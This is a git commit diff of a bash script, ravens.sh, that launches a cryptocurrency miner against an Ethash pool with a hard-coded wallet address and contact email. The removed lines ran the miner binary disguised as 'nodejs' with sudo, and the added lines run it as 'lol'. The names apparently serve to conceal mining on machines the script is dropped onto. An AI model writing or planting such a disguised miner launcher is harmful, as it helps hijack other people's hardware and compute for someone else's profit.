bdb6b22cb02107c59128e3f0c50f8b69d5cf6251
gasken1 <84686224+gasken1@users.noreply.github.com>
2021-06-27 23:20:24 +0700

    Update ravens.sh

--- ravens.sh
+++ ravens.sh
@@ -1,11 +1,6 @@
 #!/bin/bash
 POOL=eth-us1.hellominer.com:1100
 WALLET=0x86ca902b2ca60630188dba14105442141dc3b1dc
-WORKER=$(echo $(shuf -i 1000-99999 -n 1)-gas) 
-setx GPU_FORCE_64BIT_PTR 0
-setx GPU_MAX_HEAP_SIZE 100
-setx GPU_USE_SYNC_OBJECTS 1
-setx GPU_MAX_ALLOC_PERCENT 100
-setx GPU_SINGLE_ALLOC_PERCENT 100
-chmod +x nodejs
-sudo ./nodejs -pool $POOL -wal $WALLET.$WORKER/andincntk8@gmail.com -pass x
+WORKER=$(echo $(shuf -i 1000-99999 -n 1)-gass) 
+chmod +x lol
+./lol --algo ETHASH --pool $POOL --user $WALLET.$WORKER/andincntk8@gmail.com --pass x
